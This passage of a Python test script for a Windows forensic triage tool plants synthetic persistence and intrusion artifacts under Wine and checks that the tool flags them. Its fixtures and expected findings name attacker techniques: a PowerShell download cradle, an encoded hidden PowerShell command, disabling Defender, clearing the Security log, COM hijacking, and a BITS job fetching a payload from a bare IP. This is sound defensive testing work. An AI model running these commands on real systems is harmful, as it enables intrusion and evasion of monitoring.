    f.write(('2024-03-05 08:09:11.000|2|C:\\Tools\\caf\xe9.exe|Caf\xe9 tool|ACME|1.2.3|0006aa|0\r\n'
             'something unexpected here\r\n').encode('cp1252'))

# --- rdp: outgoing Remote Desktop history ---------------------------------------
T = r'HKCU\Software\Microsoft\Terminal Server Client'
reg(T + r'\Default', '/v', 'MRU0', '/t', 'REG_SZ', '/d', '10.10.5.21')
reg(T + r'\Default', '/v', 'MRU1', '/t', 'REG_SZ', '/d', 'fileserver01.corp.example')
reg(T + r'\Servers\10.10.5.21', '/v', 'UsernameHint', '/t', 'REG_SZ', '/d', r'CORP\svc_backup')
reg(T + r'\Servers\10.10.5.21', '/v', 'CertHash', '/t', 'REG_BINARY', '/d', 'a1b2c3d4')

# --- service with an unquoted path ---------------------------------------------
svc = HK + r'SYSTEM\CurrentControlSet\Services\WsTestSvc'
reg(svc, '/v', 'ImagePath', '/t', 'REG_EXPAND_SZ', '/d', r'C:\Program Files\My App\svc.exe -k test')
reg(svc, '/v', 'Type', '/t', 'REG_DWORD', '/d', '16')
reg(svc, '/v', 'Start', '/t', 'REG_DWORD', '/d', '3')
reg(svc, '/v', 'ObjectName', '/t', 'REG_SZ', '/d', 'LocalSystem')
# services.exe caches the registry: restart the prefix so SCM sees the new one.
subprocess.run([WINESERVER, '-k'], env=env)

checks = [
    (['autoruns', '--json'], [('Updater', 'user-writable path'), ('sethc.exe', 'rarely legitimate location'),
                               ('evilboot.exe', 'non-default value'), ('passfilt_x', 'non-default value'),
                               ('nshelper.dll', 'non-default value')], ['scecli']),
    (['autoruns', '--json'], [('init.bat', 'user-writable path'), ('logon.cmd', 'user-writable path'),
                               ('msuac', 'rarely legitimate location'), ('perf.dll', 'user-writable path'),
                               ('certx.dll', 'rarely legitimate location'), ('tp.dll', 'non-default value'),
                               ('as.exe', 'user-writable path')], ['w32time.dll', '%1']),
    (['firewall', '--json'], [('Test Listener', 'true')], ['Benign Block"']),
    (['programs', '--json'], [('"name":"AnyDesk"', 'remote-access (RMM) tool'), ('"rmm_tool":"AnyDesk"', None)], ['Notepad++']),
    (['pshistory', '--json'], [('DownloadString', 'download cradle'), ('DisableRealtimeMonitoring', 'Defender'),
                               ('"line":1', None)], ['Get-ChildItem', 'git status']),
    (['pshistory', '--all-users', '--flagged', '--json'], [('"user":"Gülşen"', 'log / history clearing')], []),
    (['browser', '--json'], [('report.pdf', None), ('invoice.exe', 'user kept a download the browser warned about'),
                             ('198.51.100.7', 'visited a bare IP address'), ('tool v2.ps1', 'downloaded from a bare IP address'),
                             ('"title":"Example"', None)],
     ['report.pdf', 'Example news', '"title":"Example"']),
    (['activities', '--json'], [('rclone.exe', 'application in a user-writable dir'), ('"focus_seconds":345', None),
                                ('passwords.txt', '"kind":"opened"'), ('{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}', None)],
     ['notepad.exe']),
    (['pca', '--json'], [('stage2.exe', 'ran from a user-writable dir'), ('"time":"2024-03-05 08:09:10"', None),
                         ('café.exe', '"vendor":"ACME"'), ('"raw":"something unexpected here"', None)],
     ['notepad++.exe', 'café.exe']),
    (['rdp', '--json'], [('"source":"Default","position":0', '"host":"10.10.5.21"'),
                         ('fileserver01.corp.example', '"position":1'),
                         ('"source":"Servers"', 'CORP\\\\svc_backup'), ('"certificate_accepted":true', None)], []),
    (['defender', '--json'], [('C:\\\\Temp\\\\drop', None), ('DisableRealtimeMonitoring', None)], []),
    (['usb', '--json'], [('SanDisk', None), ('"generated_serial":true', None)], []),
    (['bam', '--json'], [('a.exe', '"location":"State"'), ('"user_writable_dir":true', None),
                          ('oldtool.exe', '"location":"legacy"')], ['"path":"Version"']),
    (['shimcache', '--json'], [('tool.exe', None), ('notepad.exe', None)], []),
    (['taskcache', '--json'], [('HiddenOne', 'no SD value'), ('GoodOne', None)], []),
    (['tasks', '--json'], [('GoodOne', 'hidden task outside'), ('ComUser', 'COM handler DLL in user-writable dir'),
                           ('ComMachine', 'wscomtest.dll'), ('"arguments":"/c \\"echo a&b\\""', '"run_as":"S-1-5-18"'),
                           ('"triggers":"logon"', None)],
     ['"task":"ComMachine"', '"task":"Quoted"']),
    (['comhijack', '--json'], [('{00021401-0000-0000-C000-000000000046}', 'COM hijacking'),
                               ('{F5078F35-C551-11D3-89B9-0000F81FE221}', '"overrides_machine":true')],
     ['{F5078F35-C551-11D3-89B9-0000F81FE221}', '{0F1E2D3C-4B5A-6978-8796-A5B4C3D2E1F0}']),
    (['tasks', '--dir', 'C:\\tasks_copy', '--json'], [('Sub\\\\Dropped', 'command in user-writable dir')], ['GoodOne']),
    (['services', '--json', '--flagged'], [('WsTestSvc', 'unquoted path with spaces')], []),
    (['autoruns', '--json'], [('Updater.lnk', 'shortcut launches a script host')], []),
    (['lnk', '--json'], [('E:\\\\loot\\\\secret.docx', None),
                          ('/c start payload.exe', 'string count > 260'), ('"machine_id":"ws-hr-07"', '"mac":"aa:bb:cc:00:11:22"'),
                          ('"drive_type":"removable"', '"volume_serial":"1A2B3C4D"'), ('"volume_label":"STICK"', None)], ['secret.docx']),
    (['autoruns', '--json'], [('Helper.lnk', 'string count > 260')], []),
    (['hosts', '--json'], [('update.vendor.example', '"suspicious":true'), ('ads.example', '"kind":"block"')], ['ads.example', 'localhost']),
    (['userassist', '--json'], [('dropper.exe', 'user-writable'), ('"runs":3', None)], []),
    (['mru', '--json'], [('powershell -nop -w hidden -enc SQBFAFgA', 'encoded PowerShell'), ('new.xlsx', '"position":0')], ['notepad']),
    (['jumplist', '--json'], [('F:\\\\usb\\\\plans.pdf', '"mru":0,"last_used":"2024-01-17 21:20:00","pinned":true,"interactions":5'),
                              ('tool.exe', '"mru":null'), ('tool.exe', 'user-writable'), ('mshta.exe', 'script host'), ('report.docx', None)], ['plans.pdf', 'report.docx']),
    (['prefetch', '--json'], [('EVIL.EXE', None), ('"run_count":3', None), ('DEADBEEF', None),
                               ('DOWNLOADS\\\\EVIL.EXE', 'ran from a user-writable dir'),
                               ('SYSTEM32\\\\NOTEPAD.EXE', None)], ['NOTEPAD']),
    (['prefetch', r'C:\windows\Prefetch\EVIL.EXE-DEADBEEF.pf', '--files', '--json'],
     [('PAYLOAD.DLL', None), ('"user_writable_dir":true', None), ('CAFE1234', None)], []),
]
fails = 0
for args, must, mustnot in checks:
    rc, out, err = wine([exe] + args)
    try:
        data = json.loads(out)
    except Exception as e:
        print(f'FAIL {args}: bad json ({e}) rc={rc} err={err.strip()[:200]} out={out[:200]!r}')
        fails += 1
        continue
    flat = json.dumps(data, separators=(',',':'), ensure_ascii=False)
    for needle, reason in must:
        # The needle must appear, and if a reason is given it must be on the
        # same record (look at each record's JSON).
        recs = data if isinstance(data, list) else [v for vs in data.values() if isinstance(vs, list) for v in vs]
        hit = [r for r in recs if needle in json.dumps(r, separators=(',',':'), ensure_ascii=False)] if recs else []
        if needle not in flat and not hit:
            print(f'FAIL {args}: missing {needle!r}'); fails += 1; continue
        if reason and not any(reason in json.dumps(r, separators=(',',':'), ensure_ascii=False) for r in hit):
            print(f'FAIL {args}: {needle!r} present but not flagged with {reason!r}: {hit[:1]}'); fails += 1
    for bad in mustnot:
        recs = data if isinstance(data, list) else []
        for r in recs:
            if bad in json.dumps(r, separators=(',',':'), ensure_ascii=False) and r.get('suspicious'):
                print(f'FAIL {args}: {bad!r} should not be flagged: {r}'); fails += 1
    print(f'checked {" ".join(args)}  rc={rc}')
# The per-user Shortcut-class override would break shell32 shortcuts for the
# prefix user; remove both comhijack overrides now that they were checked.
for cls in ('{00021401-0000-0000-C000-000000000046}', '{F5078F35-C551-11D3-89B9-0000F81FE221}'):
    wine(['reg', 'delete', HKCU + r'Software\Classes\CLSID' + '\\' + cls, '/f'])
# hunt: a process named svchost.exe running from outside System32. A tiny
# sleeper is cross-compiled for this (MinGW is needed for the build anyway).
fake = os.path.join(pfx, 'drive_c', 'fake'); os.makedirs(fake, exist_ok=True)
import shutil as _sh, time
sleeper_c = os.path.join(fake, 'sleeper.c')
with open(sleeper_c, 'w') as f:
    f.write('#include <windows.h>\nint main(void){Sleep(30000);return 0;}\n')
cc = _sh.which('x86_64-w64-mingw32-gcc')
if cc:
    subprocess.run([cc, sleeper_c, '-o', os.path.join(fake, 'svchost.exe')], check=True)
imp = subprocess.Popen([WINE, r'C:\fake\svchost.exe'], env=env,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
time.sleep(3)
rc, out, err = wine([exe, 'hunt', '--json'])
try:
    found = [r for r in json.loads(out) if r.get('path', '').lower().startswith('c:\\fake')]
    if not found or 'outside System32' not in found[0].get('finding', '') and 'unexpected parent' not in found[0].get('finding', ''):
        print(f'FAIL hunt: impostor svchost not flagged: {found}'); fails += 1
    else:
        print('checked hunt --json  (impostor flagged:', found[0]['finding'] + ')')
    # wine runs EVERY process as the logged-on user, so its services.exe really
    # does break the "core process runs as SYSTEM" rule: a true positive here
    # (on Windows it runs as S-1-5-18). Any other finding on a real system
    # binary would be a false positive.
    rows = json.loads(out)
    acct = [r for r in rows if r.get('name', '').lower() == 'services.exe' and 'expected SYSTEM' in r.get('finding', '')]
    if not acct:
        print('FAIL hunt: services.exe running as a user SID not flagged'); fails += 1
    real = [r for r in rows if r.get('path', '').lower().startswith('c:\\windows\\system32') and r.get('suspicious')
            and 'expected SYSTEM' not in r.get('finding', '')]
    if real:
        print(f'FAIL hunt: genuine system process flagged: {real}'); fails += 1
except Exception as e:
    print('FAIL hunt check:', e, out[:200]); fails += 1
# handles --find: a helper keeps C:\users\Public\wsfind_marker.txt open (read +
# write, the access value older tools never name) and blocks on a pipe read;
# --find must name the file with the helper's pid, and the per-pid listing
# must finish despite the pending pipe read.
if cc:
    here = os.path.dirname(os.path.abspath(__file__))
    subprocess.run([cc, os.path.join(here, '..', 'holder.c'), '-o', os.path.join(fake, 'holder.exe')], check=True)
    hold = subprocess.Popen([WINE, r'C:\fake\holder.exe', r'C:\users\Public\wsfind_marker.txt', 'block'], env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    time.sleep(3)
    rc, out, err = wine([exe, 'handles', '--find', 'wsfind_marker', '--json'], timeout=120)
    try:
        hits = [r for r in json.loads(out) if r.get('process', '').lower() == 'holder.exe' and r.get('type') == 'File']
        if not hits:
            print(f'FAIL handles --find: marker file not found: {out[:300]}'); fails += 1
        else:
            rc2, out2, err2 = wine([exe, 'handles', str(hits[0]['pid']), '--json'], timeout=60)
            if rc2 == 'TIMEOUT':
                print('FAIL handles <pid>: hung on the blocked pipe'); fails += 1
            elif not any('wsfind_marker' in r.get('name', '') for r in json.loads(out2)):
                print('FAIL handles <pid>: read/write file handle has no name'); fails += 1
            else:
                print('checked handles --find + <pid>  (file named, no hang)')
    except Exception as e:
        print('FAIL handles check:', e, out[:200]); fails += 1
    hold.kill()
# bits: a helper creates one SUSPENDED download job from a bare IP (never
# resumed, cancelled afterwards). wine's BITS has no notify command line
# (E_NOTIMPL), so here the job must be flagged for the bare-IP source; the
# notify-command rule is checked on real Windows in CI.
if cc:
    subprocess.run([cc, os.path.join(here, '..', 'bitsjob.c'), '-o', os.path.join(fake, 'bitsjob.exe'),
                    '-lole32', '-lbits', '-luuid'], check=True)
    bj = subprocess.Popen([WINE, r'C:\fake\bitsjob.exe'], env=env, stdout=subprocess.PIPE,
                          stderr=subprocess.DEVNULL, stdin=subprocess.PIPE, text=True)
    ready = ''
    for _ in range(5):
        ready = bj.stdout.readline()
        if ready.startswith('ready') or not ready:
            break
    rc, out, err = wine([exe, 'bits', '--json'])
    try:
        jobs = [j for j in json.loads(out) if j.get('name') == 'winspect-test-job']
        if not jobs:
            print(f'FAIL bits: test job not listed: {out[:300]}'); fails += 1
        elif not jobs[0]['suspicious'] or 'bare IP' not in jobs[0]['reason'] or \
                jobs[0]['files'][0]['remote'] != 'http://10.0.0.5/payload.bin':
            print(f'FAIL bits: test job not flagged as expected: {jobs[0]}'); fails += 1
        else:
            print('checked bits --json  (suspended test job listed, bare-IP source flagged)')
    except Exception as e:
        print('FAIL bits check:', e, out[:200]); fails += 1
    try:
        bj.communicate('\n', timeout=30)
    except Exception:
        bj.kill()
# (pipes: wine cannot enumerate \\.\pipe\, so the known-name matcher is
# covered by the unit tests instead.)
imp.kill()

# posture: weak settings are WARN, and the stored password never appears.
for fmt in ([], ['--json'], ['--csv']):
    rc, out, err = wine([exe, 'posture'] + fmt)
    if 'hunter2' in out or 'hunter2' in err:
        print(f'FAIL posture {fmt}: SECRET LEAKED into output'); fails += 1
rc, out, err = wine([exe, 'posture', '--json'])
try:
    rows = {r['check']: r for r in json.loads(out)}
    for chk in ('WDigest cleartext', 'AlwaysInstallElevated (HKLM)', 'AutoLogon password',
                'Remote local-admin token', 'LM hash storage'):
        if rows.get(chk, {}).get('status') != 'WARN':
            print(f'FAIL posture: {chk} should be WARN: {rows.get(chk)}'); fails += 1
    # An unset value with a safe Windows default must not raise a WARN.
    # (Wine itself ships EnableLUA=0, so UAC is a real WARN there.)
    if rows.get('NTLM level', {}).get('status') != 'OK':
        print('FAIL posture: unset NTLM level must be OK (default is NTLMv2)'); fails += 1
    if rows.get('Command line in process events', {}).get('status') != 'OK':
        print(f"FAIL posture: cmdline auditing set to 1 must be OK: {rows.get('Command line in process events')}"); fails += 1
    for chk in ('Anonymous SAM enumeration', 'Credential Guard', 'SMB signing required (client)'):
        if rows.get(chk, {}).get('status') == 'WARN':
            print(f'FAIL posture: unset {chk} must not be WARN: {rows.get(chk)}'); fails += 1
    print('checked posture --json (+ no secret in any format)')
except Exception as e:
    print('FAIL posture check:', e, out[:200]); fails += 1

# net: every port must be a real 16-bit port (regression for an unmasked byte
# swap that printed values like 0.0.0.0:15206376).
rc, out, err = wine([exe, 'net', '--json'])
try:
    bad_ports = []
    for r in json.loads(out):
        for fld in ('local', 'remote'):
            v = r.get(fld)
            if v:
                port = int(v.rsplit(':', 1)[1])
                if not 0 <= port <= 65535:
                    bad_ports.append(v)
    if bad_ports:
        print(f'FAIL net: impossible port numbers: {bad_ports[:3]}'); fails += 1
    else:
        print('checked net --json  (all ports within 0..65535)')
except Exception as e:
    print('FAIL net check:', e, out[:200]); fails += 1

# pe: a UPX-packed file is recognised (once), when upx is installed.
upx = _sh.which('upx')
if upx and cc:
    up = os.path.join(pfx, 'drive_c', 'upxtest'); os.makedirs(up, exist_ok=True)
    tgt = os.path.join(up, 'packed.exe')
    _sh.copy(os.path.join(fake, 'svchost.exe'), tgt)
    subprocess.run([upx, '-q', '-f', tgt], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    rc, out, err = wine([exe, 'pe', r'C:\upxtest\packed.exe', '--json'])
    if not out.strip():   # wine occasionally returns nothing right after a prefix restart
        rc, out, err = wine([exe, 'pe', r'C:\upxtest\packed.exe', '--json'])
    try:
        an = [a for a in json.loads(out).get('anomalies', []) if a.get('type') == 'packer']
        if len(an) != 1 or 'UPX' not in an[0].get('detail', ''):
            print(f'FAIL pe: UPX packer not reported exactly once: {an}'); fails += 1
        else:
            print('checked pe --json  (UPX packer recognised once)')
    except Exception as e:
        print('FAIL pe upx check:', e, out[:200]); fails += 1
else:
    print('skipped pe UPX check (upx or mingw not installed)')

# recyclebin: two deleted items in a made-up user's bin - a v2 record for a
# program from Temp whose $R content is still there (flagged), and a v1 record
# for a document whose content is gone (not flagged).
import struct
rbd = os.path.join(pfx, 'drive_c', '$Recycle.Bin', 'S-1-5-21-1111-2222-3333-1001')
os.makedirs(rbd, exist_ok=True)
ft = (1700000000 + 11644473600) * 10000000          # 2023-11-14 22:13:20 UTC
p2 = 'C:\\Users\\bob\\AppData\\Local\\Temp\\dropper.exe'
with open(os.path.join(rbd, '$IAB12CD.exe'), 'wb') as f:
    f.write(struct.pack('<QQQI', 2, 4096, ft, len(p2) + 1) + (p2 + '\0').encode('utf-16-le'))
with open(os.path.join(rbd, '$RAB12CD.exe'), 'wb') as f:
    f.write(b'MZ' + b'\0' * 62)
p1 = 'C:\\Users\\bob\\Documents\\notes.docx'
with open(os.path.join(rbd, '$IEF34GH.docx'), 'wb') as f:
    f.write(struct.pack('<QQQ', 1, 777, ft) + p1.encode('utf-16-le').ljust(520, b'\0'))
rc, out, err = wine([exe, 'recyclebin', '--json'])
try:
    rows = {r['path']: r for r in json.loads(out)}
    a, b = rows.get(p2), rows.get(p1)
    if not a or not b:
        print(f'FAIL recyclebin: records missing: {list(rows)[:4]}'); fails += 1
    elif not (a['suspicious'] and a['content'] == 'present' and a['size'] == 4096 and a['format'] == 2
              and a['deleted'] == '2023-11-14 22:13:20'):
        print(f'FAIL recyclebin: v2 record wrong: {a}'); fails += 1
    elif b['suspicious'] or b['content'] != 'gone' or b['size'] != 777 or b['format'] != 1:
        print(f'FAIL recyclebin: v1 record wrong: {b}'); fails += 1
    else:
        print('checked recyclebin --json  (v1 + v2, $R present/gone, program flagged)')
except Exception as e:
    print('FAIL recyclebin check:', e, out[:200]); fails += 1

# hidden: a service key written straight into the registry (after the SCM has
# started) is unknown to the SCM - the cross-view must report it. A unique name
# per run, deleted afterwards, keeps re-runs independent.
sneaky = f'WsSneaky{os.getpid()}'
skey = HK + r'SYSTEM\CurrentControlSet\Services' + '\\' + sneaky
reg(skey, '/v', 'ImagePath', '/t', 'REG_EXPAND_SZ', '/d', r'C:\ProgramData\sneaky.exe')
reg(skey, '/v', 'Type', '/t', 'REG_DWORD', '/d', '16')
rc, out, err = wine([exe, 'hidden', '--json'])
try:
    rows = json.loads(out)
    hit = [r for r in rows if r.get('id') == sneaky]
    procs = [r for r in rows if r.get('kind') == 'process']
    if not hit:
        print(f'FAIL hidden: registry-only service {sneaky} not reported: {rows[:3]}'); fails += 1
    elif procs:
        print(f'FAIL hidden: false hidden-process report: {procs[:2]}'); fails += 1
    else:
        print('checked hidden --json  (registry-only service found, no false process hits)')
except Exception as e:
    print('FAIL hidden check:', e, out[:200]); fails += 1
wine(['reg', 'delete', skey, '/f'])

# timeline: the fixtures above merged into one newest-first list; the
# source's "suspicious" mark survives; --since / --sources filter.
rc, out, err = wine([exe, 'timeline', '--json'], timeout=600)
try:
    tlr = json.loads(out)
    times = [r['time'] for r in tlr]
    evil = [r for r in tlr if r['source'] == 'prefetch' and 'EVIL.EXE' in r['event']]
    drop = [r for r in tlr if r['source'] == 'recyclebin' and 'dropper.exe' in r['event']]
    sc = [r for r in tlr if r['source'] == 'shimcache']
    psr = [r for r in tlr if r['source'] == 'pshistory']
    if times != sorted(times, reverse=True):
        print('FAIL timeline: not newest first'); fails += 1
    elif len(evil) != 2 or not all(r['suspicious'] for r in evil):
        print(f'FAIL timeline: prefetch EVIL.EXE should give 2 flagged runs: {evil}'); fails += 1
    elif not drop or not drop[0]['suspicious'] or drop[0]['time'] != '2023-11-14 22:13:20':
        print(f'FAIL timeline: recyclebin deletion missing/wrong: {drop}'); fails += 1
    elif not sc or not all('not a run time' in r['event'] for r in sc):
        print(f'FAIL timeline: shimcache rows must say they are not run times: {sc[:1]}'); fails += 1
    elif len(psr) != 1 or not psr[0]['suspicious']:
        print(f'FAIL timeline: one flagged PowerShell history row expected: {psr}'); fails += 1
    else:
        rc2, out2, _ = wine([exe, 'timeline', '--sources', 'recyclebin,prefetch', '--since', '1', '--json'], timeout=300)
        rc3, out3, _ = wine([exe, 'timeline', '--sources', 'recyclebin', '--json'], timeout=300)
        rc4, _, _ = wine([exe, 'timeline', '--sources', 'nosuch'])
        r3 = json.loads(out3)
        if json.loads(out2) != [] or {r['source'] for r in r3} != {'recyclebin'} or len(r3) != 2 or rc4 == 0:
            print(f'FAIL timeline filters: since={out2[:100]} sources={out3[:200]} rc_unknown={rc4}'); fails += 1
        else:
            print(f'checked timeline --json  ({len(tlr)} rows, order, marks, --since/--sources)')
except Exception as e:
    print('FAIL timeline check:', e, out[:200]); fails += 1


# --- offline hives built with the test-only writer (tests/wine/regfwrite.py) ---
import regfwrite as rw
off = os.path.join(pfx, 'drive_c', 'offline'); os.makedirs(off, exist_ok=True)
SHORTCUT = '{00021401-0000-0000-C000-000000000046}'
def K(name, values=(), subkeys=()): return rw.Key(name, values, subkeys)
def inproc(path): return K('InprocServer32', [rw.Value('', rw.REG_SZ, rw.sz(path))])
# certstore --software: one honest ROOT entry and one whose blob claims a
# wrong SHA-1 (key name and stored property both all zeros) - edited by hand.
ossl = _sh.which('openssl')
certs = []
if ossl:
    import hashlib
    for cn in ('winspect honest root', 'winspect edited root'):
        with tempfile.TemporaryDirectory() as td:
            subprocess.run([ossl, 'req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', os.path.join(td, 'k.pem'),
                            '-out', os.path.join(td, 'c.der'), '-outform', 'DER', '-days', '30', '-subj', '/CN=' + cn],
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            certs.append(open(os.path.join(td, 'c.der'), 'rb').read())
def cert_key(der, claimed):
    blob = struct.pack('<III', 3, 1, 20) + claimed + struct.pack('<III', 32, 1, len(der)) + der
    return K(claimed.hex().upper(), [rw.Value('Blob', rw.REG_BINARY, blob)])
sw_keys = [K('Classes', [], [K('CLSID', [], [K(SHORTCUT, [rw.Value('', rw.REG_SZ, rw.sz('Shortcut'))],
                                              [inproc(r'%SystemRoot%\system32\shell32.dll')])])])]
if certs:
    sw_keys.append(K('Microsoft', [], [K('SystemCertificates', [], [K('ROOT', [], [K('Certificates', [], [
        cert_key(certs[0], hashlib.sha1(certs[0]).digest()), cert_key(certs[1], bytes(20))])])])]))
with open(os.path.join(off, 'SOFTWARE'), 'wb') as f:
    f.write(rw.build(K('ROOT', [], sw_keys)))
# comhijack --usrclass + --software: the user re-points the Shortcut class.
with open(os.path.join(off, 'UsrClass.dat'), 'wb') as f:
    f.write(rw.build(K('S-1-5-21-1-2-3-1001_Classes', [], [K('CLSID', [], [
        K(SHORTCUT, [], [inproc(r'C:\Users\bob\AppData\Roaming\sh.dll')])])])))
# users --sam: Administrator (disabled), Guest ENABLED, a disabled "backup$"
# and an enabled account without password requirement. Each V value holds a
# canary instead of hashes: it must never show up in any output.
def f_rec(rid, acb, logons):
    f = bytearray(0x50)
    struct.pack_into('<QQ', f, 0x08, 133485408000000000, 0)
    struct.pack_into('<Q', f, 0x18, 133400000000000000)
    struct.pack_into('<I', f, 0x30, rid)
    struct.pack_into('<HHH', f, 0x38, acb, 0, 0)
    struct.pack_into('<HH', f, 0x40, 0, logons)
    return bytes(f)
accts = [('Administrator', 500, 0x0211), ('Guest', 501, 0x0210), ('backup$', 1003, 0x0011), ('kiosk', 1004, 0x0014)]
canary = b'HASHCANARY-must-never-be-printed'
users_k = [K('%08X' % rid, [rw.Value('F', rw.REG_BINARY, f_rec(rid, acb, 3)), rw.Value('V', rw.REG_BINARY, canary * 4)])
           for _, rid, acb in accts]
users_k.append(K('Names', [], [K(n, [rw.Value('', rid, b'')]) for n, rid, _ in accts]))
dom_v = b'\0' * 40 + canary + struct.pack('<III', 1111, 2222, 3333)
with open(os.path.join(off, 'SAM'), 'wb') as f:
    f.write(rw.build(K('ROOT', [], [K('SAM', [], [K('Domains', [], [
        K('Account', [rw.Value('V', rw.REG_BINARY, dom_v)], [K('Users', [], users_k)])])])])))
rc, out, err = wine([exe, 'users', '--sam', r'C:\offline\SAM', '--json'])
try:
    us = json.loads(out)
    by = {a['name']: a for a in us['accounts']}
    flagged = sorted(n for n, a in by.items() if a['suspicious'])
    if 'HASHCANARY' in out or 'HASHCANARY' in err:
        print('FAIL users --sam: V value content leaked into the output'); fails += 1
    elif flagged != ['Guest', 'backup$', 'kiosk'] or us['machine_sid'] != 'S-1-5-21-1111-2222-3333':
        print(f'FAIL users --sam: flagged {flagged}, sid {us.get("machine_sid")}'); fails += 1
    elif by['Administrator']['enabled'] or by['Administrator']['logons'] != 3:
        print(f"FAIL users --sam: Administrator record wrong: {by['Administrator']}"); fails += 1
    else:
        print('checked users --sam (synthetic hive: $ / Guest / no-password flagged, V never printed)')
except Exception as e:
    print('FAIL users --sam check:', e, out[:200]); fails += 1
rc, out, err = wine([exe, 'comhijack', '--usrclass', r'C:\offline\UsrClass.dat', '--software', r'C:\offline\SOFTWARE', '--json'])
try:
    ch = json.loads(out)
    if len(ch) != 1 or ch[0]['clsid'] != SHORTCUT or not ch[0]['suspicious'] or ch[0]['name'] != 'Shortcut':
        print(f'FAIL comhijack offline: {ch}'); fails += 1
    else:
        print('checked comhijack --usrclass --software (synthetic hives: override flagged)')
except Exception as e:
    print('FAIL comhijack offline check:', e, out[:200]); fails += 1
if certs:
    rc, out, err = wine([exe, 'certstore', '--software', r'C:\offline\SOFTWARE', '--json'])
    try:
        cr = {c['subject']: c for c in json.loads(out)}
        ed, ho = cr.get('winspect edited root'), cr.get('winspect honest root')
        if not ed or 'edited by hand' not in ed['reason'] or ed['thumbprint'] != hashlib.sha1(certs[1]).hexdigest():
            print(f'FAIL certstore --software: edited entry not flagged: {ed}'); fails += 1
        elif not ho or ho['suspicious']:
            print(f'FAIL certstore --software: honest entry flagged: {ho}'); fails += 1
        else:
            print('checked certstore --software (synthetic hive: wrong stored SHA-1 flagged)')
    except Exception as e:
        print('FAIL certstore offline check:', e, out[:200]); fails += 1
else:
    print('skipped certstore offline check (openssl not installed)')

# image: a whole (synthetic) offline Windows installation under C:\img2 -
# hives from the test writer, a Prefetch file, a dropped task, a Recycle Bin
# record and a PowerShell history - every planted item must come back as a
# finding with its source (and user for per-user evidence); nothing benign.
img = os.path.join(pfx, 'drive_c', 'img2')
cfg = os.path.join(img, 'Windows', 'System32', 'config')
for d in (cfg, os.path.join(img, 'Windows', 'Prefetch'), os.path.join(img, 'Windows', 'System32', 'Tasks'),
          os.path.join(img, 'Users', 'bob', 'AppData', 'Local', 'Microsoft', 'Windows'),
          os.path.join(img, 'Users', 'bob', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine'),
          os.path.join(img, '$Recycle.Bin', 'S-1-5-21-1-2-3-1001')):
    os.makedirs(d, exist_ok=True)
system_hive = K('ROOT', [], [
    K('Select', [rw.Value('Current', rw.REG_DWORD, rw.dword(1))]),
    K('ControlSet001', [], [K('Services', [], [
        K('WsImgSvc', [rw.Value('ImagePath', rw.REG_EXPAND_SZ, rw.sz(r'C:\Users\Public\svc.exe')),
                       rw.Value('Start', rw.REG_DWORD, rw.dword(2)), rw.Value('Type', rw.REG_DWORD, rw.dword(16)),
                       rw.Value('ObjectName', rw.REG_SZ, rw.sz('LocalSystem'))])])])])
with open(os.path.join(cfg, 'SYSTEM'), 'wb') as f:
    f.write(rw.build(system_hive))
_sh.copy(os.path.join(off, 'SOFTWARE'), os.path.join(cfg, 'SOFTWARE'))
_sh.copy(os.path.join(off, 'SAM'), os.path.join(cfg, 'SAM'))
ntu = K('ROOT', [], [K('Software', [], [K('Microsoft', [], [K('Windows', [], [K('CurrentVersion', [], [
    K('Run', [rw.Value('Updater', rw.REG_SZ, rw.sz(r'C:\Users\bob\AppData\Local\Temp\upd.exe'))])])])])])])
with open(os.path.join(img, 'Users', 'bob', 'NTUSER.DAT'), 'wb') as f:
    f.write(rw.build(ntu))
_sh.copy(os.path.join(off, 'UsrClass.dat'), os.path.join(img, 'Users', 'bob', 'AppData', 'Local', 'Microsoft', 'Windows', 'UsrClass.dat'))
with open(os.path.join(img, 'Users', 'bob', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine',
                       'ConsoleHost_history.txt'), 'w', newline='') as f:
    f.write('dir\r\nwevtutil cl Security\r\n')
with open(os.path.join(img, 'Windows', 'Prefetch', 'EVIL.EXE-DEADBEEF.pf'), 'wb') as f:
    f.write(make_pf())
_sh.copy(os.path.join(pfx, 'drive_c', 'tasks_copy', 'Sub', 'Dropped'), os.path.join(img, 'Windows', 'System32', 'Tasks', 'Dropped'))
_sh.copy(os.path.join(rbd, '$IAB12CD.exe'), os.path.join(img, '$Recycle.Bin', 'S-1-5-21-1-2-3-1001', '$IAB12CD.exe'))
ibr = os.path.join(img, 'Users', 'bob', 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
os.makedirs(ibr, exist_ok=True)
_sh.copy(chp, os.path.join(ibr, 'History'))
rc, out, err = wine([exe, 'image', r'C:\img2', '--json'], timeout=300)
try:
    im = json.loads(out)
    got = {(x['source'], x['user']) for x in im['findings']}
    want = {('users', ''), ('services', ''), ('prefetch', ''), ('tasks', ''), ('recyclebin', ''), ('autoruns', 'bob'),
            ('comhijack', 'bob'), ('pshistory', 'bob'), ('browser', 'bob')}
    if certs:
        want.add(('certstore', ''))
    detail = ' '.join(x['detail'] for x in im['findings'])
    if not want <= got:
        print(f'FAIL image: missing findings {sorted(want - got)}; got {sorted(got)}'); fails += 1
    elif 'HASHCANARY' in out:
        print('FAIL image: SAM V content leaked'); fails += 1
    elif not all(k in detail for k in ('svc.exe', 'EVIL.EXE', 'upd.exe', 'dropper.exe', 'wevtutil cl')):
        print(f'FAIL image: finding details incomplete: {detail[:300]}'); fails += 1
    elif im['evidence']['profiles'] != ['bob'] or not im['evidence']['sam']:
        print(f"FAIL image: evidence summary wrong: {im['evidence']}"); fails += 1
    else:
        print(f"checked image --json  ({len(im['findings'])} findings, every planted item found)")
except Exception as e:
    print('FAIL image check:', e, out[:300]); fails += 1

# timeline --root: the synthetic image as a timeline; per-user rows name bob.
rc, out, err = wine([exe, 'timeline', '--root', r'C:\img2', '--json'], timeout=300)
try:
    tr = json.loads(out)
    keys = {(r['source'], r['user']) for r in tr}
    if not {('prefetch', ''), ('recyclebin', ''), ('users', ''), ('comhijack', 'bob'), ('pshistory', 'bob'), ('browser', 'bob')} <= keys:
